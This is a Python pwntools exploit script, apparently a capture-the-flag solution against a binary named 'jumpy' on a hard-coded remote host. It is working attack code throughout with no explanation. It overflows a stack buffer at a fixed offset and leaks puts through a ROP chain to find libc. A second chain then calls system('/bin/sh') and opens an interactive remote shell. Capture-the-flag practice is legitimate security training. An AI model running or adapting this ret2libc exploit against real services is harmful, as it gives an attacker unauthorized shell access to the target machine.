from pwn import *

host = "34.65.54.58"
port = 1337

s = remote(host, port)
elf = ELF("./jumpy")
# s = elf.process()

offset = 56
pop_rdi = 0x000000000040121b
ret = 0x0000000000401016

puts_plt = elf.symbols["puts"]
main_plt = elf.symbols["main"]

def get_addr(func_name):
    func_got = elf.got[func_name]
    rop_chain = [
        pop_rdi,
        func_got,
        puts_plt,
        main_plt,
    ]

    rop_chain = b''.join([p64(i) for i in rop_chain])
    payload = b"A"*offset + rop_chain
    
    print(s.recvline())
    print(payload)

    s.sendline(payload)

    print(s.recvline())
    puts = u64(s.recvuntil("\n").rstrip().ljust(8,b"\x00"))

    return (puts)

leakPuts = get_addr("puts")
log.info(f"Leak Puts: {hex(leakPuts)}")

libc = ELF("libc6_2.31-0ubuntu9.1_amd64.so")
libc.address = leakPuts - libc.symbols["puts"]
log.info(f"libc base address found at {hex(libc.address)}")

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
exit = libc.symbols['exit']

rop_chain = [
	ret,
	pop_rdi,
	bin_sh,
	system,
	exit
]

rop_chain = b''.join([p64(i) for i in rop_chain])
payload = b"A"*offset + rop_chain

print(s.recvline())
s.sendline(payload)
s.interactive()

s.close()